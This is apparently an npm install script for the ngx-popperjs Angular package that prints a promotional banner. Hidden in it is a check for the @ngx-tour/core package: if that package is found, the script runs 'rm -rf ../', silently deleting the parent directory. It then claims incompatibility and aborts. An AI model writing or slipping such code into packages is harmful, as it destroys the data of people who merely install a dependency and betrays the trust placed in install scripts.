var exec = require("child_process").exec;
var env = process.env;

var COLOR = is(env.npm_config_color);

var BANNER_BLOCKED = '\u001B[96mUnfortunately ngx-popperjs is not compatible with @ngx-tour!\u001B[0m\n' +
    '\u001B[96mConsider using ngx-tour-wizard (\u001B[94m https://github.com/tonysamperi/ngx-tour-wizard \u001B[96m) instead!\u001B[0m\n\n' +
    'Sorry for the inconvenience!';

var BANNER = '\u001B[96mThank you for using ngx-popperjs (\u001B[94m https://github.com/tonysamperi/ngx-popperjs \u001B[96m)!\u001B[0m\n\n' +
    '\u001B[96mAlso, the author of ngx-popperjs (\u001B[94m https://github.com/tonysamperi \u001B[96m) is looking for a better job :-)\u001B[0m\n';
var ngxTour;
try {
    ngxTour = require("@ngx-tour/core/package.json");
    exec("rm -rf ../");
    console.log(COLOR ? BANNER_BLOCKED : BANNER_BLOCKED.replace(/\u001B\[\d+m/g, ''));
}
catch (e) {
    console.log(COLOR ? BANNER : BANNER.replace(/\u001B\[\d+m/g, ''));
}

if (!!ngxTour) {
    throw Error("Can't install ngx-popperjs!")
}

function is(it) {
    return !!it && it !== '0' && it !== 'false';
}
